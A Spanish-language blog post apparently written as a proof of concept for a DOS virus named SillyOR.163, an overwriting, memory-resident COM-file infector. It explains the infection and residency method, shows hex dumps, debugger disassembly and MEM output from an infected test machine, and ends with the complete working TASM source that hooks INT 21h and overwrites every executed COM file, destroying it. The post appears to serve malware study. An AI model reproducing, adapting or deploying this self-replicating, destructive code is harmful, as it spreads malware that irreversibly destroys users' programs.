---
categories: [malware, programacion]
layout: post
published: true
tags: [16-bit, ASM-x86, DOS, PoC, TASM, Virus]
title: "Prueba de concepto - Virus: x86/DOS, COM, Overwriting, Residente TSR"
toc: true
---

Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por 
overwriting (sobrescritura) en archivos COM. El virus permanece residente en memoria 
convencional como un programa TSR normal. Intercepta los servicios I/O de DOS para 
infectar archivos luego de ser ejecutados.

## Método de infección
El virus simplemente sobrescribe otros archivos COM con el código viral. Es la estrategia 
más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
virus son idénticas.

![infection](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/infection.png){:width="350"}

Generalmente nada se preserva de los archivos huéspedes ya que son destruidos por la sobrescritura. 
La desinfección consiste en eliminar todos los archivos infectados.

## Residencia en memoria
El virus permanece residente en el rango de memoria convencional (por debajo de 640KB - segmento A000) 
como un programa TSR (Terminate and Stay Resident) normal mediante el servicio 27h provisto
por DOS. Durante la infección, el virus reconoce si ya se encuentra residente mediante un
servicio propio en la interrupción 21h.

![memory](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/memory.png){:width="450"}


## Método de propagación
El virus modifica el handler original de la interrupción 21h cambiando el vector del handler en 
la IVT (Interrupt Vector Table) para interceptar las llamadas a los servicios I/O de DOS. 
Esto tiene dos objetivos:
* Proveer un servicio de reconocimiento propio para saber si ya se encuentra residente en memoria.
* Detectar las ejecuciones de archivos en el sistema para infectarlos luego de que estos 
  terminan su ejecución normal.

## Flujo de ejecución
Al ejecutarse un archivo infectado, el virus se hace residente en memoria y modifica la IVT:
![flow 1](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/flow1.png){:width="280"}

Cuando el virus ya es residente en memoria, intercepta todas las llamadas a la interrupción 21h:

![flow 2](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/flow2.png){:width="400"}

## Análisis estático
Hex dump de un archivo sano de tamaño 80 bytes:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span>B4 09 BA 39 01 CD 21 90</span>  <span>´.º9.Í!.</span>
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

Hex dump del archivo infectado:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span class="vs">B8 CD AB CD 21 3D 9A 02</span>  <span class="vs">¸Í«Í!=š.</span>
<span>0x0008</span>  <span class="vs">75 04 B4 00 CD 21 B4 35</span>  <span class="vs">u.´.Í!´5</span>
<span>0x0010</span>  <span class="vs">B0 21 CD 21 89 1E A3 01</span>  <span class="vs">°!Í!‰.£.</span>
<span>0x0018</span>  <span class="vs">8C 06 A5 01 B4 25 B0 21</span>  <span class="vs">Œ.¥.´%°!</span>
<span>0x0020</span>  <span class="vs">BA 2A 01 CD 21 BA AD 01</span>  <span class="vs">º*.Í!º..</span>
<span>0x0028</span>  <span class="vs">CD 27 3D CD AB 74 0A 3D</span>  <span class="vs">Í'=Í«t.=</span>
<span>0x0030</span>  <span class="vs">00 4B 74 09 2E FF 2E A3</span>  <span class="vs">.Kt..ÿ.£</span>
<span>0x0038</span>  <span class="vs">01 B8 9A 02 CF 9C 2E FF</span>  <span class="vs">.¸š.Ïœ.ÿ</span>
<span>0x0040</span>  <span class="vs">1E A3 01 9C 2E 8F 06 A7</span>  <span class="vs">.£.œ...§</span>
<span>0x0048</span>  <span class="vs">01 50 53 51 52 56 1E 8B</span>  <span class="vs">.PSQRV.‹</span>
<span>0x0050</span>  <span class="vs">F2 AC 0A C0 74 28 3C 2E</span>  <span class="vs">ò¬.Àt(&lt;.</span>
<span>0x0058</span>  <span class="vs">75 F7 AC 3C 43 75 1F AC</span>  <span class="vs">u÷¬&lt;Cu.¬</span>
<span>0x0060</span>  <span class="vs">3C 4F 75 1A AC 3C 4D 75</span>  <span class="vs">&lt;Ou.¬&lt;Mu</span>
<span>0x0068</span>  <span class="vs">15 B4 3D B0 02 CD 21 72</span>  <span class="vs">.´=°.Í!r</span>
<span>0x0070</span>  <span class="vs">11 93 0E 1F B4 40 B9 A3</span>  <span class="vs">.“..´@¹£</span>
<span>0x0078</span>  <span class="vs">00 BA 00 01 CD 21 B4 3E</span>  <span class="vs">.º..Í!´&gt;</span>
<span>0x0080</span>  <span class="vs">CD 21 1F 5E 5A 59 5B 58</span>  <span class="vs">Í!.^ZY[X</span>
<span>0x0088</span>  <span class="vs">2E 8F 06 A9 01 2E 8F 06</span>  <span class="vs">...©....</span>
<span>0x0090</span>  <span class="vs">AB 01 9D 2E FF 36 A7 01</span>  <span class="vs">«...ÿ6§.</span>
<span>0x0098</span>  <span class="vs">2E FF 36 AB 01 2E FF 36</span>  <span class="vs">.ÿ6«..ÿ6</span>
<span>0x00A0</span>  <span class="vs">A9 01 CF               </span>  <span class="vs">©.Ï</span>
</pre>
<style>
  pre.ovf span { color: #000; }
  pre.ovf span:first-of-type { line-height:200% }
  pre.ovf span.vs { color: #ff0000 }
</style>

## Análisis dinámico
Se considera un archivo infectado VTEST.COM en un ambiente MS-DOS 6.22, 
Microsoft Virtual PC 6.0 con VM Additions.

### Uso de memoria

**Antes de la infección**  
Resultado de `MEM /C`:

<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
  Free       516,976  (505K)    516,976  (505K)          0    (0K)

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
  Conventional         654,336      137,360      516,976
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
  Total memory      16,317,440    2,300,048   14,017,392
  Total under 1 MB     654,336      137,360      516,976
</pre>

**Después de la infección**  
Resultado de `MEM /C`:

<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
  --------  ----------------   ----------------   ----------------
  MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
  SETVER         480    (0K)        480    (0K)          0    (0K)
  HIMEM        1,120    (1K)      1,120    (1K)          0    (0K)
  DISPLAY      8,304    (8K)      8,304    (8K)          0    (0K)
  CDROM        4,224    (4K)      4,224    (4K)          0    (0K)
  COMMAND      2,928    (3K)      2,928    (3K)          0    (0K)
  SMARTDRV    29,024   (28K)     29,024   (28K)          0    (0K)
  KEYB         6,944    (7K)      6,944    (7K)          0    (0K)
  FSHARE      26,576   (26K)     26,576   (26K)          0    (0K)
  IDLE           528    (1K)        528    (1K)          0    (0K)
  MSCDEX      32,096   (31K)     32,096   (31K)          0    (0K)
  MOUSE        8,880    (9K)      8,880    (9K)          0    (0K)
<span class="vs">  VTEST          608    (1K)        608    (1K)          0    (0K)</span>
  Free       516,368  (504K)    516,368  (504K)          0    (0K)

Memory Summary:
  Type of Memory       Total   =    Used    +    Free
  ----------------  ----------   ----------   ----------
  Conventional         654,336      <span class="vs">137,968      516,368</span>
  Upper                      0            0            0
  Reserved                   0            0            0
  Extended (XMS)    15,663,104    2,162,688   13,500,416
  ----------------  ----------   ----------   ----------
  Total memory      16,317,440    <span class="vs">2,300,656   14,016,784</span>
  Total under 1 MB     654,336      <span class="vs">137,968      516,368</span>
</pre>

La presencia del virus es evidente como la de cualquier programa TSR, por lo cual
es fácil de detectar. Ocupa 608 bytes de espacio en memoria convencional.

Resultado de `MEM /M VTEST`:

<pre class="ovf">Segment  Region       Total        Type
  -------  ------  ----------------  --------
   0218A                160    (0K)  Environment
   02194                448    (0K)  Program
                   ----------------
  Total Size:           608    (1K)
</pre>

Como es típico, un programa en memoria ocupa al menos dos bloques contiguos, 
el primero (218A) tiene una copia de los datos de entorno, y el segundo (2194) 
tiene el PSP, código y datos del programa. Una posible mejora del virus es 
liberar el bloque de datos de entorno ya que no son utilizados y así ocupar 
menos espacio.

El código viral tiene en memoria un tamaño de 173 B (163 B de código + 10 B reservados para datos), 
a esto se le suma el PSP con 256 B, por esto el segundo bloque requiere en total 429 B, 
pero por el alineamiento en párrafos (16 B) el próximo múltiplo de 16 es 
$\lceil\frac{429}{16}\rceil \times 16 = 432 B$. 
Además, cada bloque tiene un MCB correspondiente de 16 B, por lo tanto el bloque 
2194 tiene un tamaño total de 448 B.

### Handler de 21h
La IVT ocupa los primeros 1024 bytes de memoria RAM, segmento 0000.  
El vector de la interrupción 21h es la dirección de memoria del handler en 
forma de 4 bytes segmento:offset, este se encuentra en el offset 84h de la IVT.

**Antes de la infección**  
Hex dump de los 4 bytes del vector 21h:

<pre class="ovf">-D 0000:0084 L4                                  
0000:0080              E1 20 04 11
</pre>

El handler original de 21h se encuentra en 1104:20E1.

**Después de la infección**  
Hex dump de los 4 bytes del vector 21h:

<pre class="overf">-D 0000:0084 L4
0000:0080              2A 01 95 21
</pre>

El vector ya no es el mismo. 

Desensamblado del handler referenciado por el nuevo vector:

<pre class="ovf">-U 2195:012A
2195:012A 3DCDAB       CMP      AX,ABCD      ; inicio del handler viral
2195:012D 740A         JZ0139                   
2195:012F 3D004B       CMP      AX,4B00                            
2195:0132 7409         JZ       013D                               
2195:0134 2E           CS:	                                   
2195:0135 FF2EA301     JMP      FAR [01A3]                 
2195:0139 B89A02       MOV      AX,029A                            
2195:013C CF           IRET	                                   
2195:013D 9C           PUSHF	                                   
2195:013E 2E           CS:	                                   
2195:013F FF1EA301     CALL     FAR [01A3]   ; llamada al handler original
2195:0143 9C           PUSHF	                                   
2195:0144 2E           CS:	                                   
2195:0145 8F06A701     POP      [01A7]                             
2195:0149 50           PUSH     AX  
</pre>

Hex dump de 4 bytes en 2195:01A3:

<pre class="ovf">-D 2195:01A3 L4
2195:01A0              E1 20 04 11           ; el vector original de 21h
</pre>

## API utilizada
Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Servicio</th>
      <th>AH</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>
  <tr>
    <td>Terminar programa</td>
    <td>00h</td>
    <td class="center">-</td>
    <td class="center">-</td>   
    <td>1+</td>
  </tr>
  <tr>
    <td>Establecer vector en IVT</td>  
    <td>25h</td> 
    <td>AL = número de interrupción</td> 
    <td>DS:DX = puntero al nuevo handler de la interrupción</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Obtener vector de IVT</td>
    <td>35h</td> 
    <td>AL = número de interrupción</td>
    <td>ES:BX = puntero al handler de la interrupción</td>
    <td>2+</td>
  </tr> 
  <tr>
    <td>Abrir archivo existente</td>  
    <td>3Dh</td>
    <td>AL = modos de acceso e intercambio<br/>DS:DX -> nombre del archivo (ASCIZ)</td>
    <td>Éxito: CF = 0, AX = handle del archivo <br/>Error: CF = 1, AX = código de error</td>  
    <td>2+</td>
  </tr> 
  <tr>
    <td>Cerrar archivo</td>
    <td>3Eh</td>
    <td>BX = handle del archivo</td>
    <td>Éxito: CF = 0, AX destruido <br/>Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Escribir en archivo <br/>o dispositivo</td>
    <td>40h</td> 
    <td>BX = handle del archivo <br/>CX = nro. de bytes <br/>DS:DX -> datos a escribir</td>
    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br/>Error: CF = 1, AX = código de error</td> 
    <td>2+</td>
  </tr>
</table>
</div>

Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Interrupción 27h</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>  
  <tr>
    <td>Terminar programa y dejar porción residente en memoria</td> 
    <td>CS = segmento de PSP <br/> DX = dirección más alta a ocupar en memoria</td> 
    <td>-</td>
    <td>1+</td>
  </tr>
</table>
</div>

## Código fuente
{% highlight nasm linenos %}
;###############################################################################  
;# Nombre:        virus://DOS/SillyOR.163  
;# Plataforma:    Intel x86  
;# SO:            DOS v2.0+  
;# Lenguaje:      ASM x86-16 (sintaxis Intel)  
;# Herramientas:  TASM v4.1, TLINK v7.1.30  
;# Tipo:          Overwriting, Resident, COM infector  
;# Tamaño:        163 bytes  
;# Propagación:   En archivos COM luego de ser ejecutados (INT 21h - AH=4B).  
;# Infección:     Sobrescritura de archivos COM (no READ-ONLY).  
;# Residente:     Si. Dentro de la memoria convencional (0-640KB), en la  
;#                zona baja del sistema.  
;# Stealth:       No  
;# Payload:       No  
;##############################################################################
                    .8086  
                    .model tiny

                    assume cs:virus, ds:virus

          virus     segment byte public 'CODE'

                    org 100h

         start:     mov ax, 0ABCDh                    ; | AX = 0ABCDh  
                    int 21h                           ; |_DOS API - Llamar servicio de reconocimiento del virus
                    
                    cmp ax, 029Ah                     ; verificar código de respuesta  
                    jne infect_int21h                 ; si no es 666 (29Ah), infectar INT 21h
                    
                    mov ah, 00h                       ; | AH = 00h  
                    int 21h                           ; |_DOS API - Retornar a DOS 

 infect_int21h:     mov ah, 35h                       ; | AH = 35h  
                    mov al, 21h                       ; | AL = número de interrupción, 21h  
                    int 21h                           ; |_DOS API - Obtener vector en ES:BX
                    
                    mov [vector_int21], bx            ; guardar vector original de INT 21h  
                    mov [vector_int21 + 2], es
                    
                    mov ah, 25h                       ; | AH = 25h  
                    mov al, 21h                       ; | AL = número de interrupción, 21h  
                    mov dx, offset handler_int21h     ; | DS:DX -> dirección del nuevo handler: handler_int21h  
                    int 21h                           ; |_DOS API - Cambiar vector
                    
                                                      ; | CS = segmento de PSP  
                    mov dx, offset eof                ; | DX = Tamaño de porción residente (bytes)  
                    int 27h                           ; |_DOS API - Termina el programa y lo deja en memoria 

handler_int21h:     cmp ax, 0ABCDh                    ; llamada de verificación del virus:  
                    je service_ABCD                   ; responder y retornar  
                    cmp ax, 4B00h                     ; llamada para ejecutar archivo:  
                    je infect_file                    ; infectar y delegar  
                    jmp dword ptr cs:[vector_int21]   ; en otro caso, delegar al handler original de INT 21h 

  service_ABCD:     mov ax, 029Ah                     ; código de respuesta: 666 (29Ah)  
                    iret                              ; retornar de la interrupción

   infect_file:     pushf  
                    call dword ptr cs:[vector_int21]  ; simular INT 21h para ejecutar archivo

                    pushf  
                    pop cs:[ret_EFLAGS]
                    
                    push ax                           ; guardar registros que serán utilizados  
                    push bx  
                    push cx  
                    push dx  
                    push si  
                    push ds  
                                                      ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
                    mov si, dx                        ; verificar que sea extensión ".COM"  
      loop_str:     lodsb  
                    or al, al  
                    jz close_file  
                    cmp al, '.';  
                    jne loop_str  
                    lodsb  
                    cmp al, 'C';  
                    jne close_file  
                    lodsb  
                    cmp al, 'O';  
                    jne close_file  
                    lodsb  
                    cmp al, 'M'  
                    jne close_file 
                    
                    mov ah, 3Dh                       ; | AH = 3Dh  
                    mov al, 2                         ; | AL = 2, lectura y escritura  
                    int 21h                           ; |_DOS API - Abrir archivo existente 
                    
                    jc exit                           ; si no se puede abrir archivo, restaurar y delegar  
                    xchg ax, bx                       ; handle de archivo en BX
                    
                    push cs  
                    pop ds                            ; MOV DS, CS
                    
                    mov ah, 40h                       ; | AH = 40h  
                    mov cx, virus_size                ; | CX = tamaño del virus  
                    mov dx, offset start              ; | DS:DX -> origen: inicio del código viral  
                    int 21h                           ; |_DOS API - Escribir en archivo/dispositivo

    close_file:     mov ah, 3Eh                       ; | AH = 3Eh  
                    int 21h                           ; |_DOS API - Cerrar archivo 

          exit:     pop ds                            ; restaurar registros  
                    pop si  
                    pop dx  
                    pop cx  
                    pop bx  
                    pop ax 
                    
                    pop cs:[ret_IP]  
                    pop cs:[ret_CS]  
                    popf
                    
                    push cs:[ret_EFLAGS]  
                    push cs:[ret_CS]  
                    push cs:[ret_IP]  
                    iret

      virus_size    equ ($ - start)                   ; tamaño del virus  
    vector_int21    dw ?, ?                           ; vector original de INT 21h (4 bytes)  
      ret_EFLAGS    dw ?                              ; registro de estado del CPU  
          ret_IP    dw ?                              ; puntero a la instrucción de retorno  
          ret_CS    dw ?                              ; segmento de código de retorno 

            eof:                                      ; fin de porción residente para TSR

           virus    ends  
             end    start  
{% endhighlight %}

## Bibliografía
{% bibliography -q
   @*[key=Szor2005
   || key=Phalcon-Skism,
   || key=Williams1992] 
%} 